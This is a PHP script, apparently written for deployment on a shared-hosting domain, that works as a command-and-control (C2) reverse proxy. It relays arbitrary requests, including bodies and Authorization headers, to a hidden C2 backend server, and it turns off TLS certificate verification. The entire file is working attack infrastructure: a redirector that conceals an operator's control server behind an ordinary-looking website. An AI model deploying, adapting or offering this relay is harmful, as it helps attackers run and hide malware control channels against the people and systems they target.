<?php
/**
 * C2 reverse proxy — deploy to khaotic.fr webroot (PHP shared hosting).
 * Relays /c2proxy.php?p=<path> → C2_BACKEND/<path>
 *
 * Backend: set C2_BACKEND env var in .htaccess, e.g.:
 *   SetEnv C2_BACKEND https://YOUR_VPS_IP:8443
 * Falls back to https://127.0.0.1:8443 (same-host VPS deploy).
 *
 * Drop in Apache webroot; no mod_proxy / AllowOverride needed.
 */

// Whitelist allowed paths
$path = $_GET['p'] ?? '';
if (!preg_match('/^\/[a-zA-Z0-9\/_\-\.]*$/', $path)) {
    http_response_code(400);
    header('Content-Type: application/json');
    echo json_encode(['error' => 'bad path']);
    exit;
}

$backend = rtrim(getenv('C2_BACKEND') ?: 'https://127.0.0.1:8443', '/');
$target  = $backend . $path;

// Preserve query string (minus our own 'p' param)
$qs = $_SERVER['QUERY_STRING'] ?? '';
$qs = preg_replace('/(^|&)p=[^&]*/', '', $qs);
$qs = ltrim($qs, '&');
if ($qs !== '') {
    $target .= '?' . $qs;
}

$ch = curl_init($target);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $_SERVER['REQUEST_METHOD']);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

// Forward body (POST/PUT/PATCH)
$body = file_get_contents('php://input');
if ($body !== false && $body !== '') {
    curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
}

// Forward headers
$fwd = [];
if (!empty($_SERVER['CONTENT_TYPE'])) {
    $fwd[] = 'Content-Type: ' . $_SERVER['CONTENT_TYPE'];
}
if (!empty($_SERVER['HTTP_AUTHORIZATION'])) {
    $fwd[] = 'Authorization: ' . $_SERVER['HTTP_AUTHORIZATION'];
}
if (!empty($fwd)) {
    curl_setopt($ch, CURLOPT_HTTPHEADER, $fwd);
}

$response = curl_exec($ch);
if ($response === false) {
    http_response_code(502);
    header('Content-Type: application/json');
    echo json_encode(['error' => 'upstream unreachable', 'detail' => curl_error($ch)]);
    curl_close($ch);
    exit;
}

$http_code   = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
curl_close($ch);

$resp_headers = substr($response, 0, $header_size);
$resp_body    = substr($response, $header_size);

http_response_code($http_code);

foreach (explode("\r\n", $resp_headers) as $line) {
    if (stripos($line, 'Content-Type:') === 0) {
        header($line);
        break;
    }
}

echo $resp_body;
